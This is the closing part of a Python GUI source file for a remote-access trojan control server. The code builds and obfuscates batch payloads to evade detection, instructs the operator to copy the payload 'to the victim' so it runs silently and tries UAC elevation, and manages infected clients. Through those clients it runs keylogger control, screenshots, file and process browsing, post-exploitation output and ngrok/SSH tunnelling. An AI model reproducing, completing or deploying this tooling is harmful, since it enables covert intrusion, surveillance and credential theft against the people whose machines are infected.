            f"Size     : {size_kb:.1f} KB\n"
            f"Host     : {host}\n"
            f"Port     : {port}\n"
            f"Obfuscated: NO  (plain BAT)\n\n"
            f"Copy payload.bat to the victim and double-click it.\n"
            f"No Python required -- PowerShell only.\n"
            f"Runs silently; attempts UAC elevation automatically.\n"
        )
        self._set_status(f"Payload saved -> {save_path}")

    def _obf_toggle_caret(self):
        if self._obf_caret_var.get():
            self._obf_caret_entry.configure(state="normal")
        else:
            self._obf_caret_entry.configure(state="disabled")

    def _payload_generate_and_obfuscate(self):
        host = self._payload_host.get().strip()
        port = self._payload_port.get().strip()
        if not host or not port.isdigit():
            messagebox.showwarning("Invalid input", "Enter a valid host and port.")
            return

        use_carets   = self._obf_caret_var.get()
        caret_count  = 0
        if use_carets:
            raw = self._obf_caret_count_var.get().strip()
            if not raw.isdigit():
                messagebox.showwarning("Invalid caret count",
                                       "Caret count must be a positive integer.")
                return
            caret_count = int(raw)

        save_path = filedialog.asksaveasfilename(
            defaultextension=".bat",
            filetypes=[("Batch file", "*.bat"), ("All files", "*.*")],
            initialfile="payload_obf.bat",
            title="Save obfuscated payload",
        )
        if not save_path:
            return

        self._set_status("Running obfuscation pipeline...")
        self._payload_log("Obfuscation pipeline running...\n")

        token = self._var_token.get().strip()

        def worker():
            try:
                bat_text    = _generate_bat(host, int(port), token=token)
                obf_bytes   = _run_obf_pipeline(bat_text, use_carets, caret_count)
                with open(save_path, "wb") as fh:
                    fh.write(obf_bytes)
                orig_kb = len(bat_text.encode("utf-8")) / 1024
                out_kb  = len(obf_bytes) / 1024
                self.gui_queue.put(("payload_log",
                    f"[Generate & Obfuscate  v3.1]\n\n"
                    f"Saved     : {save_path}\n"
                    f"Original  : {orig_kb:.1f} KB  (plain BAT)\n"
                    f"Obfuscated: {out_kb:.1f} KB  ({out_kb / max(orig_kb, 0.001):.1f}x)\n"
                    f"Host      : {host}\n"
                    f"Port      : {port}\n"
                    f"Carets    : {'YES  x' + str(caret_count) if use_carets else 'NO'}\n\n"
                    f"Obfuscation layers applied:\n"
                    f"  UTF-16 LE BOM + &cls prepend\n"
                    f"  Per-run randomised 26-char alphabet\n"
                    f"  3-part master key from env-vars\n"
                    f"  FOR /L CALL-trick shorthand (%_N%)\n"
                    f"  Alternate env-var sources (random)\n"
                    f"  Dynamic header with random carets\n"
                    f"  REM noise injection\n"
                    f"  Junk variable groups\n"
                    f"{'  Random ^ caret injection  x' + str(caret_count) + chr(10) if use_carets else ''}"
                    f"\nCopy payload_obf.bat to the victim and double-click it.\n"
                ))
                self.gui_queue.put(("status", f"Obfuscated payload saved -> {save_path}"))
            except Exception as exc:
                self.gui_queue.put(("payload_log", f"[Obfuscation error]\n{exc}\n"))
                self.gui_queue.put(("status", "Obfuscation failed"))

        threading.Thread(target=worker, daemon=True).start()

    def _payload_launch_obfuscator(self):
        if not HAS_OBF_CLI:
            messagebox.showwarning(
                "Missing packages",
                "Required packages are not installed:\n"
                "  pyfiglet  easygui  tqdm  colorama\n\n"
                "Restart the C2 server to auto-install them."
            )
            return
        script = os.path.abspath(__file__)
        flags  = subprocess.CREATE_NEW_CONSOLE if sys.platform == "win32" else 0
        try:
            subprocess.Popen(
                [sys.executable, "-c",
                 f"import sys; sys.path.insert(0, r'{os.path.dirname(script)}'); "
                 f"from c2server import obf_main; obf_main()"],
                creationflags=flags,
            )
            self._set_status("Standalone obfuscator launched in new window")
        except Exception as exc:
            messagebox.showerror("Launch error", str(exc))

    def _build_statusbar(self):
        bar = _frame(self.root, bg=C["bg3"])
        bar.pack(fill="x", side="bottom")
        self._statusbar_var = tk.StringVar(value="Ready")
        tk.Label(bar, textvariable=self._statusbar_var, bg=C["bg3"], fg=C["text2"],
                 font=FONT_UI_SM, anchor="w", padx=10, pady=4).pack(side="left")
        tk.Label(bar, text="\U0001f380 AmericanDream7", bg=C["bg3"], fg=C["accent2"],
                 font=("Segoe UI", 8, "bold"), padx=10, pady=4).pack(side="right")

    def _set_status(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self._statusbar_var.set(f"[{ts}]  {msg}")

    def _server_log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self._statusbar_var.set(f"[{ts}]  {msg}")
        self.gui_queue.put(("shell_out", f"[SERVER {ts}] {msg}\n"))

    def _on_token_change(self, *_args):
        tok = self._var_token.get().strip()
        self._auth_token = tok
        if self._server_running and self.server:
            self.server.auth_token = tok
            self._set_status(
                f"⚠ Token changed to '{tok or '(empty)'}' — REGENERATE payload or victims won't connect!"
            )

    def _toggle_server(self):
        if self._server_running:
            self._stop_server()
        else:
            self._start_server()

    def _start_server(self):
        host = self._var_host.get().strip() or DEFAULT_HOST
        try:
            port = int(self._var_port.get())
        except ValueError:
            messagebox.showerror("Invalid port", "Port must be a number.")
            return
        try:
            self._auth_token = self._var_token.get().strip()
            self.server = RATServer(host, port,
                                    self._on_client_connect,
                                    self._on_client_disconnect,
                                    auth_token=self._auth_token,
                                    on_log=self._server_log)
            self.server.start()
            self._server_running = True
            threading.Thread(target=self._heartbeat_loop, daemon=True).start()
            self._btn_toggle.configure(text="\u25a0  Stop", fg=C["error"])
            self._lbl_srv.configure(text=f"\u25cf Running  {host}:{port}", fg=C["success"])
            self._set_status(f"Listening on {host}:{port}")
        except Exception as exc:
            messagebox.showerror("Server error", str(exc))

    def _auto_fetch_info(self, session):
        def worker():
            try:
                resp = session.send_command({"type": "os_info"})
                if resp and resp.get("status") == "ok":
                    data = resp.get("data", {})
                    if isinstance(data, dict):
                        session.info.update(data)
                        self.gui_queue.put(("client_info_updated", session.id))
            except Exception:
                pass
        threading.Thread(target=worker, daemon=True).start()

    def _heartbeat_loop(self):
        while self._server_running:
            time.sleep(40.0)
            if not self._server_running:
                break
            for cid, session in list(self.clients.items()):
                alive = session.ping(timeout=10)
                if not alive:
                    self.gui_queue.put(("client_disconnect", cid))

    def _stop_server(self):
        if self.server:
            self.server.stop()
            self.server = None
        self._server_running = False
        self._btn_toggle.configure(text="\u25b6  Start", fg=C["success"])
        self._lbl_srv.configure(text="\u25cf Stopped", fg=C["error"])
        self._set_status("Server stopped")

    def _on_client_connect(self, session):
        self.gui_queue.put(("client_add", session))

    def _on_client_disconnect(self, client_id):
        self.gui_queue.put(("client_disconnect", client_id))

    def _on_client_select(self, event=None):
        sel = self._client_tree.selection()
        if not sel:
            self._selected_client = None
            return
        client_id = int(sel[0])
        self._selected_client = self.clients.get(client_id)

    def _disconnect_client(self):
        client = self._selected_client
        if not client:
            return
        client.close()
        self._remove_client(client.id)

    def _remove_client(self, client_id):
        self.clients.pop(client_id, None)
        try:
            self._client_tree.delete(str(client_id))
        except Exception:
            pass
        if self._selected_client and self._selected_client.id == client_id:
            self._selected_client = None
        self._lbl_client_count.configure(text=str(len(self.clients)))
        self._set_status(f"Client #{client_id} disconnected")

    def _add_client(self, session):
        self.clients[session.id] = session
        label = (f"  {session.label}  |  {session.os_label}"
                 .replace("\n", " ").replace("\r", ""))
        self._client_tree.insert("", "end", iid=str(session.id), text=label)
        self._lbl_client_count.configure(text=str(len(self.clients)))
        pub = session.info.get("public_ip", "")
        display_ip = pub if (pub and pub not in ("?", "")) else session.ip
        self._set_status(f"New connection from {display_ip} -- {session.label}")

    def _process_queue(self):
        try:
            while True:
                item = self.gui_queue.get_nowait()
                kind = item[0]
                try:
                    if kind == "client_add":
                        new_s = item[1]
                        hn = new_s.info.get("hostname", "")
                        un = new_s.info.get("username", "")
                        new_ip = new_s.ip
                        _was_selected = False
                        _EMPTY_HN = {"", "UNKNOWN"}
                        for _cid in list(self.clients.keys()):
                            _ex = self.clients.get(_cid)
                            if not _ex:
                                continue
                            ex_hn = _ex.info.get("hostname", "")
                            ex_un = _ex.info.get("username", "")
                            same = (
                                hn and ex_hn
                                and hn not in _EMPTY_HN
                                and ex_hn not in _EMPTY_HN
                                and hn == ex_hn
                                and un == ex_un
                            )
                            if same:
                                if self._selected_client and self._selected_client.id == _cid:
                                    _was_selected = True
                                _ex.connected = False
                                self._remove_client(_cid)
                        self._add_client(new_s)
                        try:
                            self._client_tree.selection_set(str(new_s.id))
                            self._selected_client = new_s
                        except Exception:
                            pass
                        
                    elif kind == "client_info_updated":
                        _upd_s = self.clients.get(item[1])
                        if _upd_s:
                            try:
                                _lbl = (f"  {_upd_s.label}  |  {_upd_s.os_label}"
                                        .replace("\n", " ").replace("\r", ""))
                                self._client_tree.item(str(_upd_s.id), text=_lbl)
                            except Exception:
                                pass
                            if self._selected_client and self._selected_client.id == _upd_s.id:
                                pub = _upd_s.info.get("public_ip", "")
                                display_ip = pub if (pub and pub not in ("?", "")) else _upd_s.ip
                                self._set_status(f"Connected: {display_ip} — {_upd_s.label}")
                    elif kind == "client_disconnect":
                        self._remove_client(item[1])
                    elif kind == "shell_out":
                        self._shell_append(item[1])
                    elif kind == "sys_out":
                        self._sys_append(item[1])
                    elif kind == "surv_out":
                        self._surv_append(item[1])
                    elif kind == "screenshot":
                        self._display_screenshot(item[1])
                    elif kind == "file_list":
                        self._files_populate(item[1], item[2])
                    elif kind == "refresh_files":
                        self._files_navigate(item[1])
                    elif kind == "proc_list":
                        self._proc_populate(item[1])
                    elif kind == "proc_list_err":
                        self._proc_status.configure(text=f"Error: {item[1]}")
                    elif kind == "proc_refresh":
                        self._proc_refresh()
                    elif kind == "kl_status":
                        running, msg = item[1], item[2]
                        if running:
                            self._kl_status_var.set("\u25cf Running")
                            self._kl_status_lbl.configure(fg=C["success"])
                        else:
                            self._kl_status_var.set("\u25cf Stopped")
                            self._kl_status_lbl.configure(fg=C["error"])
                        self._surv_append(f"[Keylogger] {msg}\n")
                    elif kind == "tunnel_up":
                        mode, addr = item[1], item[2]
                        if mode == "ngrok":
                            self._ngrok_status_var.set("\u25cf Running")
                            self._ngrok_status_lbl.configure(fg=C["success"])
                            self._ngrok_addr_var.set(addr)
                        else:
                            self._ssh_status_var.set("\u25cf Running")
                            self._ssh_status_lbl.configure(fg=C["success"])
                            self._ssh_addr_var.set(addr)
                        self._set_status(f"Tunnel UP -> {addr}")
                    elif kind == "tunnel_err":
                        mode, err = item[1], item[2]
                        if mode == "ngrok":
                            self._ngrok_status_var.set("\u25cf Error")
                            self._ngrok_status_lbl.configure(fg=C["error"])
                        else:
                            self._ssh_status_var.set("\u25cf Error")
                            self._ssh_status_lbl.configure(fg=C["error"])
                        messagebox.showerror("Tunnel error", err)
                    elif kind == "callback":
                        callback, resp = item[1], item[2]
                        callback(resp)
                    elif kind == "status":
                        self._set_status(item[1])
                    elif kind == "server_log":
                        self._server_log(item[1])
                    elif kind == "msgbox":
                        messagebox.showinfo(item[1], item[2])
                    elif kind == "payload_log":
                        self._payload_log(item[1])
                    elif kind == "postex_out":
                        w = self._postex_out
                        w.configure(state="normal")
                        w.insert("end", item[1])
                        w.see("end")
                        w.configure(state="disabled")
                    elif kind == "ai_response":
                        self._ai_chat_append(f"\n[AI] {item[1]}\n", "ai_tag")
                    elif kind == "ai_error":
                        self._ai_chat_append(f"\n[Error] {item[1]}\n", "error_tag")
                    elif kind == "client_info_update":
                        session = item[1]
                        try:
                            label = f"  {session.label}  |  {session.os_label}"
                            self._client_tree.item(str(session.id), text=label)
                        except Exception:
                            pass
                except Exception as _qe:
                    self._set_status(f"[GUI error:{kind}] {_qe}")
        except queue.Empty:
            pass
        finally:
            self.root.after(80, self._process_queue)

    def _on_close(self):
        if self._server_running:
            self._stop_server()
        self._tunnel.stop()
        self.root.destroy()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    ServerApp()

